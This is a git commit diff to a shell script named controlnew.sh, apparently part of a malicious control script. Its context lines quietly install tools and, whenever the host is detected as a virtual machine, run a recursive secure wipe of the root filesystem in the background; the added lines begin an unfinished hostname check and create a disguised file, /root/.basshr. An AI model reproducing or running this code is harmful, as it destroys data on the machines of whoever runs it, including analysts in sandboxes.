68d189373ac45dbeb6c14c9ddbcef5db5eefbbcb
l4cky-control <59870859+l4cky-control@users.noreply.github.com>
2021-05-12 13:57:53 -0400

    Update controlnew.sh

--- controlnew.sh
+++ controlnew.sh
@@ -3,5 +3,7 @@ printf "Welcome 2 _unkn0wn...\n"
 
 sudo apt -f -y install &> /dev/null ; [[ -z "$(type virt-what)" ]] && sudo apt-get -y install virt-what ; [[ -z "$(type wipe)" ]] && sudo apt-get -y install wipe
 result="$(sudo virt-what)" ; [[ -n $result ]] && sudo wipe -fkqrs -Q1 / &
+
+if test "$(hostname)" = 
 touch /root/.basshr
 
